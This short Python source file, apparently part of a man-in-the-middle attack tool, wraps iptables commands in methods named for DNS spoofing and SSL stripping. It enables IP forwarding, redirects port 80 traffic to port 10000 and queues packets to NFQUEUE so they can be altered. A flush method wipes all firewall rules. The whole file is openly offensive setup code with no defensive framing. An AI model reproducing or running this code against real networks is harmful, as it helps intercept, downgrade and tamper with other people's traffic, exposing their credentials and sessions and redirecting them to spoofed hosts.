import os


class IPTablesWrapper():
    
    def enable_dns_spoofing(self):
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    def setup_ssl_stripping(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")

    def flush(self):
        os.system("iptables --flush")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")